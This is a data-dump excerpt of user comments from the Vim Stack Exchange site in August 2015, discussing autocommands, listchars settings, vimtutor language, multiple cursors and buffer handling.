  <row Id="6267" PostId="4280" Score="0" Text="Your attempt doesn't make sense, `autocmd`s are not applied in the order they are defined.  Re: `BufReadPost` not working: perhaps you need a `nested` flag?  Re: running a function only once per file: you can set a buffer-local variable to signal the function has run." CreationDate="2015-08-12T10:18:44.987" UserId="2313" />
  <row Id="6268" PostId="4280" Score="0" Text="@cxw I'm on Vim 7.4.778." CreationDate="2015-08-12T10:42:32.480" UserId="21" />
  <row Id="6269" PostId="4280" Score="0" Text="@SatoKatsura I've clarified the question and improved the current technique. As mentioned, the current technique works mostly OK, except for the case when I open several buffers in different tabs." CreationDate="2015-08-12T10:51:58.967" UserId="21" />
  <row Id="6270" PostId="4279" Score="0" Text="No, I didn't. I guess this is the canonical way to proceed for what I want?" CreationDate="2015-08-12T11:20:04.637" UserId="985" />
  <row Id="6274" PostId="3654" Score="0" Text="Maybe the vim built-in function `fnameescape()` could help you?" CreationDate="2015-08-11T14:02:48.223" UserId="3102" />
  <row Id="6275" PostId="4289" Score="0" Text="Thanks, I thought using `\zs`/`\ze` is enough to catch the previous reference value, but it seems the brackets are mandatory." CreationDate="2015-08-12T13:52:04.930" UserId="467" />
  <row Id="6276" PostId="4288" Score="1" Text="I don't think you can do it without a little bit of scripting. You can look at `:h sign` to know how to place a sign in the singbar and use it as the number bar" CreationDate="2015-08-12T14:39:50.533" UserId="1821" />
  <row Id="6277" PostId="4280" Score="1" Text="I don't understand the need for the augroups. A BufWinEnter autocmd like this is all you should need: `au BufWinEnter * if &amp;ft == &quot;text&quot; | call MyFunction() | endif`. Get rid of the autocmd and augroup stuff in MyFunction() and leave just `... do stuff ...`." CreationDate="2015-08-12T15:05:07.113" UserId="2055" />
  <row Id="6278" PostId="4283" Score="0" Text="IMHO this is still crazy use of autocmds. But you don't seem to care to hear that anyway." CreationDate="2015-08-12T15:18:43.073" UserId="2313" />
  <row Id="6279" PostId="3654" Score="0" Text="@nfarrar If you found a working solution to your problem it would be better if you could post it as an answer rather than putting it in your question ;-)" CreationDate="2015-08-12T15:33:31.060" UserId="1841" />
  <row Id="6280" PostId="4286" Score="0" Text="Can you please add some more explanation?" CreationDate="2015-08-12T15:42:24.773" UserId="865" />
  <row Id="6281" PostId="4292" Score="1" Text="Are you NerdTree buffers truly unlisted? Check `:ls!`. Do you get `0` when do `:echo buflisted(bufnr('%'))` inside the NerdTree buffer? You may also want to use `has_key(g:MyDic, newBufNr)`. See `:h has_key`. Maybe it would be best to use `expand('&lt;abuf&gt;')` in your autocmd calls. See `:h &lt;abuf&gt;`" CreationDate="2015-08-12T15:55:43.003" UserId="778" />
  <row Id="6282" PostId="4286" Score="0" Text="@EvergreenTree Done." CreationDate="2015-08-12T16:04:26.913" UserId="467" />
  <row Id="6284" PostId="4243" Score="0" Text="I think, this is more or less my final &quot;solution&quot;, until NetRW can do this natively. I will still take care of remaining known issues, but expect to find (or be pointed to) more subtle bugs, fixes, and enhancements. They will be addressed/incorporated. Thank you for commenting." CreationDate="2015-08-12T18:47:27.683" UserId="3102" />
  <row Id="6285" PostId="4294" Score="2" Text="`:helpgrep SpecialComment`" CreationDate="2015-08-12T18:59:41.250" UserId="54" />
  <row Id="6286" PostId="4294" Score="0" Text="@romainl `special things inside a comment` which is that result isn't really any more helpful." CreationDate="2015-08-12T19:03:07.247" UserId="25" />
  <row Id="6287" PostId="4294" Score="0" Text="Yes it is helpful: it tells you that you shouldn't worry about it." CreationDate="2015-08-12T19:19:03.547" UserId="54" />
  <row Id="6288" PostId="4297" Score="0" Text="Hm, this seems to work for me? When you use `nnoremap`, you always map the original built-in Vim meaning of the right-hand-side, so I see no reason why this shouldn't work..." CreationDate="2015-08-12T20:06:31.733" UserId="51" />
  <row Id="6289" PostId="4294" Score="0" Text="@Dom ever used a `TODO` or `FIXME` in a comment?" CreationDate="2015-08-12T20:11:35.180" UserId="205" />
  <row Id="6290" PostId="4294" Score="0" Text="@muru yep and there's group already for `TODO`, `FIXME`, and others under Todo in the highlight syntax." CreationDate="2015-08-12T20:24:30.153" UserId="25" />
  <row Id="6291" PostId="462" Score="0" Text="and without printing messages on screen :silent! bufdo e" CreationDate="2015-08-12T20:26:19.677" UserId="3159" />
  <row Id="6292" PostId="4294" Score="0" Text="It's Vim: customize to your taste! E.g. (for a C file): `syn match SpecialComment '///.*\n'` :P" CreationDate="2015-08-12T20:31:38.513" UserId="1800" />
  <row Id="6293" PostId="4280" Score="0" Text="@garyjohn Your solution would mean that the function is called everytime the buffer is entered after it has been hidden. It is essential that the function is called only once, and that it is called AFTER the filetype plugins have been sourced." CreationDate="2015-08-12T20:35:30.497" UserId="21" />
  <row Id="6294" PostId="4283" Score="1" Text="@SatoKatsura It is still the only solution to my problem that I know of so far. However, the problem itself might be badly described. Unfortunately, I do not really understand what about it that is difficult to understand. That is, your idea of setting a buffer local variable might also work. In any case, I see that I need to clarify the problem, so I will update the question." CreationDate="2015-08-12T20:36:49.917" UserId="21" />
  <row Id="6295" PostId="4294" Score="1" Text="@Dom Ah. Yes. Ok, I went looking and it seems Josh is right. There was no usage of `SpecialComment` in syntastic, and of the stuff shipped by my distro (Ubuntu 14.04, `SpecialComment`s were used by only a few major syntax files - `vim`, Java (Javadoc comment headers), Haskell (pragmas), and some more." CreationDate="2015-08-12T20:47:22.260" UserId="205" />
  <row Id="6296" PostId="4280" Score="0" Text="I have now updated the question again. I have provided more background, as it seems necessary to understand the problem. Perhaps I am asking the wrong question, but so far I have not found any solution that works except the one I have posted below. I would be happy if anyone have a more elegant solution." CreationDate="2015-08-12T21:03:00.057" UserId="21" />
  <row Id="6297" PostId="4283" Score="1" Text="@SatoKatsura I do not understand why you say I &quot;don't seem to care to hear that anyway&quot;; I would be very happy to get alternative and perhaps better solutions. I have now updated the question in order to provide some more background. I think that should make it easier to see why my use of autocommands is not that crazy. And if they are, then I would be VERY happy to hear of a different way of doing this." CreationDate="2015-08-12T21:06:57.877" UserId="21" />
  <row Id="6299" PostId="4297" Score="1" Text="This works for me too, maybe try using `vim -u NONE` to see if any of your plugins are causing issues" CreationDate="2015-08-12T21:25:11.037" UserId="1472" />
  <row Id="6300" PostId="4298" Score="0" Text="It may be a ... VI.rus ! (just kidding). I'd simply install a recent Vim, e.g. https://bintray.com/veegee/generic/vim_x64." CreationDate="2015-08-12T21:39:13.307" UserId="1800" />
  <row Id="6301" PostId="4298" Score="1" Text="@VanLaser Haha - no. `vimtutor en` starts it in english, however this is not the default. If I do `vimtutor` only, it opens up in portuguese." CreationDate="2015-08-12T21:44:18.537" UserId="3160" />
  <row Id="6302" PostId="4280" Score="0" Text="BufWinEnter _is_ triggered _after_ the filetype plugins have been sourced. You have a good point about the hidden-to-displayed transition, though. I never hide buffers, so I often forget about that case. A solution to that would be to set b:myfunction_called when MyFunction() is called and add a test for `exists(&quot;b:myfunction_called&quot;)` to the autocommand, so that MyFunction() is called only once per buffer." CreationDate="2015-08-12T22:59:10.273" UserId="2055" />
  <row Id="6303" PostId="4300" Score="3" Text="Try `:set lazyredraw` (`:h lazyredraw`)" CreationDate="2015-08-13T01:10:32.820" UserId="1800" />
  <row Id="6304" PostId="4283" Score="0" Text="No offense intended, but this is the only solution known to you because you stopped looking.  How about calling `windo normal zx` to update the folding, and setting the defaults in a ftplugin for new files.  `autocmd`s are fragile commands with many known problems. They are not applied in a logical order, they may not refer to the file you think, they may not be applied at the right time, etc.  You should try to avoid them when possible.  Instead, you use `CursorMoved` which is one of the worst offenders, to do one-time operations.  And the &quot;self-destructing&quot; thing might earn you a segfault." CreationDate="2015-08-13T02:17:41.307" UserId="2313" />
  <row Id="6305" PostId="4283" Score="0" Text="Also, as far as I can tell the performance problem reported on GitHub has a very different root: `foldexpr` is called insanely often (and particularly so in insert mode) because of a long-standing bug in Vim, and you're making it worse with carelessly written regexps.  Simply shuffling things around and getting rid of all those lookdbehinds can save you from going straight to the worst case scenario and speed things up considerably.  But the better approach would be to simply disable `foldexpr` when in insert mode.  There are other problems there, but you didn't ask about that. _shrug_" CreationDate="2015-08-13T02:27:40.830" UserId="2313" />
  <row Id="6306" PostId="4284" Score="0" Text="I would say that pressing `&lt;Alt-&lt;&gt;` and `&lt;Alt-&gt;&gt;` insert another character the one you would expected, so I could explain your issue... e.g. on my computer it insert respectivly `¯` and `˘`" CreationDate="2015-08-13T04:16:08.317" UserId="1821" />
  <row Id="6307" PostId="4297" Score="0" Text="This worked for me also, I noticed that both `,` and `#` can be used now to find the previous match." CreationDate="2015-08-13T04:20:15.540" UserId="1821" />
  <row Id="6308" PostId="4303" Score="2" Text="That's a lot of trouble when you could do `set listchars=tab:\ \ ,...`." CreationDate="2015-08-13T07:27:17.720" UserId="54" />
  <row Id="6309" PostId="4303" Score="0" Text="@romainl then make an answer :)" CreationDate="2015-08-13T07:27:42.003" UserId="3164" />
  <row Id="6310" PostId="4304" Score="0" Text="Didn't know you could do `\ `, though it makes sense since you can search with them (`/\ `). I was trying `\s`, `' '`, etc." CreationDate="2015-08-13T07:33:55.520" UserId="3164" />
  <row Id="6311" PostId="4304" Score="0" Text="Hm, I get `E474: Invalid argument: listchars=tab:\ \ ,...` with Vim 7.4.778?" CreationDate="2015-08-13T08:10:46.647" UserId="51" />
  <row Id="6312" PostId="4298" Score="1" Text="What the value of `v:lang`? `:echo v:lang`." CreationDate="2015-08-13T08:12:46.367" UserId="51" />
  <row Id="6313" PostId="4304" Score="0" Text="@Carpetsmoker, the three dots are here for elision." CreationDate="2015-08-13T08:21:37.213" UserId="54" />
  <row Id="6314" PostId="4283" Score="0" Text="@SatoKatsura My code supports two modes for folding: One automatic and one manual. The manual mode keeps `foldexpr` disabled at all times, except during a manual refresh. The automatic mode enables `foldexpr` in insert mode. Berhaps the automatic mode instead should enable `foldexpr` during normal mode instead of insert mode, that seems to make more sense." CreationDate="2015-08-13T08:22:06.347" UserId="21" />
  <row Id="6315" PostId="4283" Score="0" Text="Let us [continue this discussion in chat](http://chat.stackexchange.com/rooms/26918/discussion-between-karl-yngve-lervag-and-sato-katsura)." CreationDate="2015-08-13T08:22:15.433" UserId="21" />
  <row Id="6316" PostId="4299" Score="0" Text="cool script, thanks for the effort!" CreationDate="2015-08-13T08:25:03.883" UserId="2512" />
  <row Id="6317" PostId="4302" Score="1" Text="Note that setting a space as a tab means you won't be able to distinguish between spaces and tabs, or see tabs in other places (like inside a string, end of the line). It sort of defeats the purpose of `set list` ;-) Some other (smaller) character you may try: `·` (MIDDLE DOT),  `␣` (OPEN BOX) or `₋` (SUBSCRIPT MINUS). (I personally use: `set listchars=tab:!·`)." CreationDate="2015-08-13T08:28:28.910" UserId="51" />
  <row Id="6318" PostId="4304" Score="1" Text="Oops, yes, I got confused :-/" CreationDate="2015-08-13T08:28:36.620" UserId="51" />
  <row Id="6319" PostId="4302" Score="0" Text="@Carpetsmoker correct. This is why I have a linter. :) Exclamation point might not be so bad, I suppose I could play around with them." CreationDate="2015-08-13T08:28:59.997" UserId="3164" />
  <row Id="6320" PostId="4304" Score="0" Text="@Carpetsmoker try `set listchars=tab:\ \ ,trail:·,eol:¬,nbsp:_`" CreationDate="2015-08-13T08:29:59.773" UserId="3164" />
  <row Id="6321" PostId="4280" Score="0" Text="Yes, I agree, that would seem like a solution. However, when I test it, it seems `BufWinEnter` does not work fully as expected. That is, for some reason, it still won't work with `vim -p *.tex`." CreationDate="2015-08-13T08:30:08.270" UserId="21" />
  <row Id="6322" PostId="4301" Score="2" Text="FYI, with xterm on Linux I get `0x1b 0x3e` and `0x1b 0x3c` With `Alt+&lt;` and `Alt+&gt;` (in other words, I get the expected Esc+key, instead of the MACRON and BREVE characters)." CreationDate="2015-08-13T09:00:59.470" UserId="51" />
  <row Id="6323" PostId="4292" Score="0" Text="As I said in my question I debugged the buflisted property of nerdtree buffers and I confirm that the value of `buflisted(bufnr('%'))` for nerdtree buffers is 0. Also I didn't know `:ls!` but I get a `u` in front of those buffers, so know I'm really sure they are unlisted :-) Thanks for your other advices I'll definitely check them!" CreationDate="2015-08-13T09:24:10.170" UserId="1841" />
  <row Id="6324" PostId="4298" Score="0" Text="@Carpetsmoker It's PT (portuguese). Is this what I need to change?" CreationDate="2015-08-13T11:38:37.697" UserId="3160" />
  <row Id="6325" PostId="4298" Score="0" Text="So that's the source of the problem ;-) [`:help v:lang`](http://vimhelp.appspot.com/eval.txt.html#v%3alang) tells me it should be inherited from the OS (Windows in your case), or set explicitly by the user with the `:language` command ... But that won't help you, since the tutor file has already been loaded in the wrong language..." CreationDate="2015-08-13T11:53:16.243" UserId="51" />
  <row Id="6326" PostId="4298" Score="0" Text="@Carpetsmoker So what is the solution?" CreationDate="2015-08-13T11:53:48.347" UserId="3160" />
  <row Id="6327" PostId="4298" Score="0" Text="I don't know ;-) If I had one, I would have offered it. Perhaps one of your locale settings is in Portuguese? There's a control panel thingy to set this (`Clock, Language, and Region`, and then `Region and Language`)." CreationDate="2015-08-13T12:27:33.943" UserId="51" />
  <row Id="6328" PostId="4298" Score="0" Text="It's a long shot, but do you have `set encoding=utf-8` in your vimrc?" CreationDate="2015-08-13T12:28:11.350" UserId="1800" />
  <row Id="6329" PostId="4307" Score="1" Text="You could see : https://github.com/terryma/vim-multiple-cursors/issues/86 and http://www.vim.org/scripts/script.php?script_id=4467" CreationDate="2015-08-13T16:10:01.837" UserId="1821" />
  <row Id="6330" PostId="4307" Score="1" Text="I think that an important question to ask is why do you want to do that? What are you trying to do? Using multiple cursors isn't really &quot;following the Vim way&quot;, there is probably a different way to do what you want, at least as efficient, using built-in features." CreationDate="2015-08-13T18:08:31.487" UserId="1841" />
  <row Id="6331" PostId="4300" Score="0" Text="Indeed `lazyredraw` is probably the best solution. You could also provide your macro and a sample file so we can see if it can be optimized." CreationDate="2015-08-13T18:42:47.053" UserId="1841" />
  <row Id="6332" PostId="4305" Score="1" Text="Sadly, the answer is no." CreationDate="2015-08-13T19:07:53.390" UserId="2313" />
  <row Id="6333" PostId="4307" Score="0" Text="@statox. See edit. I gave two examples that came to my mind. The second one I can accomplish with the vim-multiple-cursors plugin, but the first one I can't, at least in an easy manner." CreationDate="2015-08-13T19:32:27.930" UserId="2977" />
  <row Id="6334" PostId="4307" Score="0" Text="@Nobe4. Thanks, the second script made it." CreationDate="2015-08-13T19:33:19.103" UserId="2977" />
  <row Id="6335" PostId="4311" Score="0" Text="perfect! thanks!" CreationDate="2015-08-13T20:03:13.470" UserId="1097" />
  <row Id="6336" PostId="4301" Score="0" Text="@Carpetsmoker Depending on your keyboard settings, you may need to use &lt;ALTGR&gt; to type those letters. And you can also map them. With ALTGR i get 'ł€¶ŧ←↓→øþæßðđŋħł«»¢“”nµ·' (and others) that I can map to vim goodness. I can also get ' ̈́' but have managed to type UpperBar yet." CreationDate="2015-08-13T20:07:56.487" UserId="3102" />
  <row Id="6337" PostId="4305" Score="0" Text="protip: local variables are the default inside of functions so you can probably forgo the `l:` namespace declaration." CreationDate="2015-08-13T20:39:03.073" UserId="778" />
  <row Id="6338" PostId="4306" Score="0" Text="Note: `:s` with a sub-replace-expression and the `n` flag is only available since Vim 7.3.627+. Otherwise you need to do an actually substitution (lame as this will mark the buffer as modified). You probably also want to save and restore the search register, `@/`, or use `:keeppatterns`." CreationDate="2015-08-13T20:43:49.250" UserId="778" />
  <row Id="6339" PostId="4310" Score="0" Text="It's a pretty nice solution. I knew perfectly the `.` key command, but never thought of using it that way. I agree it is a nice way. But your answer doesn't actually refer to the real question, so it wouldn't be appropriate to accept it I guess." CreationDate="2015-08-13T21:15:29.513" UserId="2977" />
  <row Id="6340" PostId="4310" Score="0" Text="Well, your question (after you added the desired use-cases) reminded me of &quot;I really like my scissors, and want to tighten a screw with them. Tell me how&quot;. And me pointing you to a nifty use for a screwdriver ;)  (I added as an answer, because i don't know, how to do formatting in comments)" CreationDate="2015-08-13T21:24:03.693" UserId="3102" />
  <row Id="6341" PostId="4308" Score="0" Text="Note that directly editing the tutor files (your &quot;2nd method&quot;) is probably not a good idea. The `vimtutor` program *copies* this file to a temporary file, so you can muck about at your leisure and not foul anything up ;-) I recommend you do that, instead." CreationDate="2015-08-13T22:04:52.427" UserId="51" />
  <row Id="6342" PostId="4284" Score="0" Text="In insert mode, press `Ctrl+V` then `Alt+&lt;`. What is inserted?" CreationDate="2015-08-13T22:16:00.983" UserId="8" />
  <row Id="6343" PostId="4312" Score="0" Text="Very complete answer. I actually did know all those commands, but never thought of using them like that... I guess I need more practice. However, I must say that sometimes the 'vim-way' takes longer than just using some plugin (for example, your CSS example can be done much quicker with the plugin I mentioned), and sometimes it takes much shorter (actually, the vast majority of times vim is faster than any text editor, if used properly)." CreationDate="2015-08-13T22:18:30.880" UserId="2977" />
  <row Id="6344" PostId="4301" Score="0" Text="@AlexStragies AltGr and Alt are different keys. Alt+character sends ESC followed by that character on most terminals, translated from the Alt+key keychord by the terminal emulator. AltGr+character inserts a different character which depends on the keyboard layout and is managed by the OS/GUI environment, not by the terminal emulator." CreationDate="2015-08-13T22:19:22.523" UserId="8" />
  <row Id="6345" PostId="4312" Score="0" Text="Btw, I think your answer is already pretty complete. I will accept it, but if you want to add more details, please do and I'll be glad to read them." CreationDate="2015-08-13T22:20:35.923" UserId="2977" />
  <row Id="6346" PostId="4301" Score="0" Text="@Gilles, I was aware of the ability to (exit Insert Mode+&lt;CMDKEY&gt;) with ALT-CMDKEY, because it sends &lt;ESC&gt; &lt;CMDKEY&gt;. I was trying to point out how to get many mappable characters with ALTGR. For me the 2 Keys from the OP example require ALTGR" CreationDate="2015-08-13T22:38:47.023" UserId="3102" />
  <row Id="6347" PostId="4314" Score="0" Text="And what you expect to be completed?" CreationDate="2015-08-13T23:18:39.097" UserId="1145" />
  <row Id="6348" PostId="4308" Score="0" Text="Yes, it is written in the answer (copying the file somewhere else)." CreationDate="2015-08-13T23:32:06.620" UserId="1067" />
  <row Id="6349" PostId="4314" Score="1" Text="I would presume file names like when doing tabe or buf" CreationDate="2015-08-14T04:57:24.080" UserId="1166" />
  <row Id="6350" PostId="4181" Score="0" Text="@Badger as iTerm instance it starts without spawning terminal. If it doesn't spam terminal for you, that means it's by macbook problem. Can you please post that as an answer so I can accept it?" CreationDate="2015-08-14T06:15:20.357" UserId="3064" />
  <row Id="6351" PostId="4181" Score="0" Text="@Badger Thanks to you I have found a problem: it was osascript in my ~/.bashrc that started terminal." CreationDate="2015-08-14T06:21:14.740" UserId="3064" />
  <row Id="6352" PostId="4314" Score="5" Text="`open` has only one argument `:open /pattern/` (see `:help open`) and no complete options. For file completion you must define your own command, something like this `:command -complete=file -nargs=1 Open open &lt;args&gt;` see `:help command`. You can define custom function completion. Or use `:edit` command instead." CreationDate="2015-08-14T08:21:21.837" UserId="1145" />
  <row Id="6353" PostId="4312" Score="1" Text="@tomasyany: Indeed sometimes using the &quot;vim way&quot; might seem longer (I can't count how many times I spend more time on creating a working macro than if I had done the changes manually) but with the practice it eventually get faster. I've been using Vim for only one year and I'm (very) far from being an expert but I can feel that my editing continuously improves as I practice." CreationDate="2015-08-14T09:22:59.007" UserId="1841" />
  <row Id="6354" PostId="4314" Score="3" Text="Also see: [What does :open do in vim?](http://vi.stackexchange.com/q/2275/51)." CreationDate="2015-08-14T10:49:49.277" UserId="51" />
  <row Id="6355" PostId="4318" Score="2" Text="I asked this question on SO last year: [How can I get the same behaviour navigating tabs if I use expandtab](http://stackoverflow.com/q/27525238/660921), but never really got a satisfactory answer other than &quot;use `w` or `^` to skip the indentation&quot;." CreationDate="2015-08-14T10:58:09.440" UserId="51" />
  <row Id="6356" PostId="4314" Score="1" Text="@Alex I think your comment should be an answer (especially the `-complete` argument in command creation is pretty nice to know about)" CreationDate="2015-08-14T14:12:12.950" UserId="1841" />
  <row Id="6357" PostId="4281" Score="0" Text="I don't know how to use your answer, can you explain it further, please? &#xA;&#xA;E.g. I have a snippet `ec` that expands to `ê` and I use `&lt;Tab&gt;` key to expand snippets.&#xA;&#xA;In insert mode, I type&#xA;`tec&lt;Tab&gt;`&#xA;and get&#xA;`tê`.&#xA;&#xA;In command-line mode to search, I type&#xA;`/tec&lt;Tab&gt;`&#xA;but get nothing.&#xA;&#xA;How do I use this `:call UltiSnips#ExpandSnippetOrJump()`?" CreationDate="2015-08-14T14:15:12.353" UserId="3140" />
  <row Id="6358" PostId="4281" Score="0" Text="Oh ok I didn't understand your question, let me update my answer :)" CreationDate="2015-08-14T14:20:31.893" UserId="1821" />
  <row Id="6359" PostId="4122" Score="1" Text="It appears that the problem is that I needed `set cpoptions-=Z`. I guess that changed between Vim 6.3 and 7.4" CreationDate="2015-08-14T15:04:44.430" UserId="3016" />
  <row Id="6360" PostId="4342" Score="0" Text="Did not realize open operated that way. Guess I'll have to get myself to start using edit (or just buffer and tabe, I suppose), or fallback to a custom command if I can't make the mental switch lol." CreationDate="2015-08-14T18:31:22.390" UserId="1166" />
  <row Id="6361" PostId="4312" Score="0" Text="Should probably mention the `gn` text object as well. It addresses some use cases of multiple cursors. Search with `/`, then `dgn` or `cgn`, then repeat with `.`." CreationDate="2015-08-15T01:17:40.057" UserId="578" />
  <row Id="6362" PostId="4246" Score="0" Text="@VanLaser Too bad isn't it. At that rate all the humanity will descend into nothingness in no time!" CreationDate="2015-08-15T03:01:43.320" UserId="1315" />
  <row Id="6363" PostId="4249" Score="0" Text="@muru That's too bad since Emacs actually has a lot to offer, especially its org-mode which has been massively helpful to me. I recommend you check out the project Spacemacshttps://github.com/syl20bnr/spacemacs/ , which focuses heavily on Vim emulation so that you don't need to know any traditional Emacs command to use. Maybe that'll change your perception a bit." CreationDate="2015-08-15T03:10:30.020" UserId="1315" />
  <row Id="6364" PostId="4343" Score="2" Text="For the specific case of commits, the `FileType` is `gitcommit`. You can probably use an `autocmd` based on that." CreationDate="2015-08-15T06:31:02.830" UserId="205" />
  <row Id="6365" PostId="4312" Score="0" Text="@Justin I'm not really familiar with `gn` I'll give it a try and add it after. Thanks for the head up!" CreationDate="2015-08-15T07:52:11.597" UserId="1841" />
  <row Id="6366" PostId="4343" Score="4" Text="git also adds a number of variables to the environment, so you could test for the existence of one of those variables to determine whether Vim was launched from git. E.g., `if exists(&quot;$GIT_DIR&quot;)`." CreationDate="2015-08-15T07:54:30.700" UserId="2055" />
  <row Id="6367" PostId="4246" Score="0" Text="&quot;Abandon hope, all ye who `&lt;CR&gt;` here&quot;" CreationDate="2015-08-15T09:40:28.597" UserId="1800" />
  <row Id="6368" PostId="4249" Score="0" Text="@XiangJi no doubt, but I don't see any need to use it. Wherever I'm likely to find Emacs, I'm also likely to find Vim. On every system I administer, either vim-gnome or vim-nox (in terms of Ubuntu packages) is installed. Emacs is only installed where someone has requested it." CreationDate="2015-08-15T10:16:24.637" UserId="205" />
  <row Id="6369" PostId="4343" Score="1" Text="@muru That should really be an answer! Nice orthogonal alternatives :)" CreationDate="2015-08-15T11:28:55.877" UserId="925" />
  <row Id="6370" PostId="4292" Score="0" Text="I don't have NERDTree installed, so ... but if I can suggest another approach: leave the NERDTree buffers listed, and filter buffer addition in current tab list by the buffer's *name*. Also if you split the `if` in 2 parts, and assign those parts, each, to a variable, then you can check their values before the condition (`if nonlisted &amp;&amp; unmanaged ...`)." CreationDate="2015-08-15T11:55:33.203" UserId="1800" />
  <row Id="6371" PostId="4292" Score="1" Text="@VanLaser: I thought of filtering the buffers according to their name but I think that might be less robust than the `buflisted` parameter: for now I've had problem only with NerdTree, but I'm not sure I will not have the same issue with another plugin and adding a condition for each case might be not very convenient. But if I don't find another solution that's probably what I'll do. Also yes when I'm debugging I split the `if` I put it back together for the question." CreationDate="2015-08-15T12:03:23.953" UserId="1841" />
  <row Id="6372" PostId="4344" Score="0" Text="wow, vim is too rich to learn." CreationDate="2015-08-15T12:46:03.380" UserId="1097" />
  <row Id="6373" PostId="4344" Score="1" Text="Do we need `--noplugin` with `-u NONE`?" CreationDate="2015-08-15T14:31:51.753" UserId="205" />
  <row Id="6374" PostId="4318" Score="0" Text="Use `noexpandtab`, configure 4-space tabs, and `:retab`. At the end, if you must, re-enable `expandtab` and `:retab` again." CreationDate="2015-08-15T14:53:24.120" UserId="1800" />
  <row Id="6375" PostId="4344" Score="2" Text="@muru, I could *swear* it was needed at some point but… not anymore. Whatever, let me edit my answer." CreationDate="2015-08-15T15:16:52.863" UserId="54" />
  <row Id="6378" PostId="4348" Score="0" Text="I take it that you could not generate a valid Turkish spell file for Vim (:h spell-mkspell) ?" CreationDate="2015-08-15T17:53:33.630" UserId="1800" />
  <row Id="6379" PostId="4348" Score="0" Text="@VanLaser No, at least not one that works worth beans. Turkish is an  agglutinated language and coming up with a comprehensive word list for it is near impossible. The spell checker needs to understand bits of the grammar to have a fighting chance of being useful in the real world." CreationDate="2015-08-15T17:55:17.953" UserId="267" />
  <row Id="6380" PostId="4348" Score="1" Text="I ask because I had problems with Romanian, and solved it. Did you try using the word list files from a recent version of hunspell or myspell? E.g. something like the `dict_aff...` from https://code.google.com/p/tr-spell/downloads/list or similar/newer/more comprehensive." CreationDate="2015-08-15T18:05:37.983" UserId="1800" />
  <row Id="6381" PostId="4348" Score="0" Text="@VanLaser What is recent? It's probably been at least a year since I last tried that route." CreationDate="2015-08-15T18:08:46.023" UserId="267" />
  <row Id="6382" PostId="4348" Score="0" Text="I mean, it's not clear what the problem is (is it the number of words, or the Vim understanding of grammar)" CreationDate="2015-08-15T18:09:49.440" UserId="1800" />
  <row Id="6383" PostId="4348" Score="0" Text="If you run this command, with cursor over a bad-spelled word (as highlighted by your plugin), what's the result? `:echo map(synstack(line('.'), col('.')), 'synIDattr(v:val, &quot;name&quot;)')` There seem to be an issue getting any syntax information (at least on my machine)." CreationDate="2015-08-15T18:39:56.167" UserId="1800" />
  <row Id="6384" PostId="4351" Score="1" Text="http://vi.stackexchange.com/q/3997/205?" CreationDate="2015-08-15T20:38:30.987" UserId="205" />
  <row Id="6385" PostId="4297" Score="0" Text="thanks guys for the comments, updated with relevant info" CreationDate="2015-08-15T22:05:41.760" UserId="590" />
  <row Id="6386" PostId="4297" Score="4" Text="Perhaps you also have another 2-letter mapping that starts with `#`, and infinite timeout length? In this case, when you press `#`, vim will wait for the second letter, indefinitely." CreationDate="2015-08-15T22:20:57.540" UserId="1800" />
  <row Id="6387" PostId="4292" Score="0" Text="Perhaps you add a buffer number for a certain buffer, but afterwards that number points to *another* buffer (e.g. the NERDTree one) - which would suggest some add/delete management issues (de-sync)." CreationDate="2015-08-15T23:23:22.610" UserId="1800" />
  <row Id="6388" PostId="4292" Score="0" Text="Might be tricky getting the right buffer number: see [this](https://github.com/Shougo/tabpagebuffer.vim/blob/master/plugin/buffer.vim#L42) with [this](https://groups.google.com/forum/#!msg/vim_use/AvQROAIUnSQ/1bZseM7YObwJ)" CreationDate="2015-08-15T23:34:21.107" UserId="1800" />
  <row Id="6394" PostId="4357" Score="0" Text="Yeh, it works. Thanks. Can you tell me how to get the help manual for me to further learn it myself?" CreationDate="2015-08-16T09:56:25.383" UserId="1788" />
  <row Id="6395" PostId="4357" Score="1" Text="You're welcome - I went from reading `:help :substitute` to `:help sub-replace-special`, and from there, to `:help sub-replace-expression`, as this is were the reading of those help sections pointed me to (by following `\=`). And in the 3rd mentioned section, there is an example that concatenates 3 strings in the replace part. This gave me the idea." CreationDate="2015-08-16T10:03:33.267" UserId="1800" />
  <row Id="6396" PostId="4292" Score="0" Text="@VanLaser: thank you very much for your comments. I edited my answer to show the new results following your advises." CreationDate="2015-08-16T10:06:09.413" UserId="1841" />
  <row Id="6397" PostId="4319" Score="1" Text="Added this to my .vimrc. To me, this solves the problem the OP describes. It is also a nice&amp;simple example of several vim scripting techniques. I'm keeping this :)" CreationDate="2015-08-16T10:25:58.003" UserId="3102" />
  <row Id="6399" PostId="4319" Score="0" Text="@AlexStragies: I'm glad you keep it! :)" CreationDate="2015-08-16T11:11:58.517" UserId="1841" />
  <row Id="6400" PostId="4344" Score="0" Text="Why do you think its no longer needed?  The way plugins are loaded hasn't changed in many years." CreationDate="2015-08-16T11:19:34.817" UserId="2313" />
  <row Id="6401" PostId="4358" Score="1" Text="You could even use the utf-8 linedrawing characters: '╔═╗║╚═╝┌─┐│└─┘', If you want to create 'configuration'-files, that can also double as 'documentation', and will look like something to the boss, when he sees it printed on your wall. :)" CreationDate="2015-08-16T11:33:59.373" UserId="3102" />
  <row Id="6402" PostId="4344" Score="0" Text="@SatoKatsura, I *seem* to remember a situation where netrw was loaded even with `-u NONE`. Maybe my memory is flawed. Maybe something else was messing with my setup at the time…" CreationDate="2015-08-16T11:36:58.587" UserId="54" />
  <row Id="6403" PostId="4355" Score="0" Text="You should also reset the register type see `:h getregtype()`" CreationDate="2015-08-16T11:44:36.977" UserId="71" />
  <row Id="6404" PostId="4346" Score="1" Text="Looking at the sources, it's probably safe to forget about it.  Getting from a keyword to a tag goes something like this: first a number of special cases are recognized, and the keyword is transformed accordingly.  Then a special regexp is crafted from the keyword (in a ~200 lines function), and the regexp is used to look up tags in the help tag files.  Then the results are assigned numbers heuristically, based on  how the regexp has matched, where, etc., and the results are sorted by these numbers.  You can probably emulate all this dance in VimL if you're determined, but it won't be nice." CreationDate="2015-08-16T11:48:17.387" UserId="1577" />
  <row Id="6405" PostId="4354" Score="1" Text="I don't use this plugin so my solution might be totally out but does `:set iskeyword+=.` would solve your problem?" CreationDate="2015-08-16T14:01:16.310" UserId="1841" />
  <row Id="6406" PostId="4359" Score="0" Text="Ah, but I don't want to use the vimdoc site - that's why I added the point about URL encoding." CreationDate="2015-08-16T16:23:38.320" UserId="205" />
